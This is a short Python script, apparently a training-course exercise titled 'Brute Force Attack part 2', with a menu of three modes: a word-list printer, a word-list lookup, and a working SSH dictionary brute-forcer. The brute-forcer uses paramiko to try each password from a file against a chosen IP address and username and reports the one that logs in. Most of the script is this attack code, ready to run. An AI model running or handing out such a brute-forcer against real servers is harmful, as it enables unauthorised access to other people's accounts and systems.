#!/usr/bin/env python3

# Script:                       opschallange 17
# Author:                       Bryanna Fox
# Date of latest revision:      1/30/2024
# Purpose:                      Brute Force Attack part 2

import time
import paramiko

def offensive_mode(word_list_file):
    with open(word_list_file, 'r') as f:
        for word in f:
            word = word.strip()  
            print(word)
            time.sleep(0.5)  

def defensive_mode(search_string, word_list_file):
    with open(word_list_file, 'r') as f:
        word_list = [line.strip() for line in f]

    if search_string in word_list:
        print(f"The string '{search_string}' was found in the word list.")
    else:
        print(f"The string '{search_string}' was not found in the word list.")

def ssh_brute_force(username, ip_address, word_list_file):
    with open(word_list_file, 'r') as f:
        for password in f:
            password = password.strip()
            print(f"Trying password: {password}")
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip_address, username=username, password=password)
                print(f"Login successful! Password: {password}")
                ssh.close()
                return password
            except paramiko.AuthenticationException:
                print("Authentication failed.")
            except paramiko.SSHException as e:
                print(f"SSH error: {e}")
            except Exception as e:
                print(f"Error: {e}")
            time.sleep(0.5)

if __name__ == "__main__":
    print("Select mode:")
    print("1. Offensive; Dictionary Iterator")
    print("2. Defensive; Password Recognized")
    print("3. SSH Brute Force")
    mode = input("Enter mode number: ")

    if mode == "1":
        word_list_file = input("Enter the word list file path: ")
        offensive_mode(word_list_file)
    elif mode == "2":
        search_string = input("Enter the string to search: ")
        word_list_file = input("Enter the word list file path: ")
        defensive_mode(search_string, word_list_file)
    elif mode == "3":
        username = input("Enter the username: ")
        ip_address = input("Enter the IP address: ")
        word_list_file = input("Enter the word list file path: ")
        result = ssh_brute_force(username, ip_address, word_list_file)
        if result:
            print(f"Successful login! Password: {result}")
        else:
            print("Unable to find valid password in the word list.")
    else:
        print("Invalid mode selected. Please choose 1, 2, or 3.")
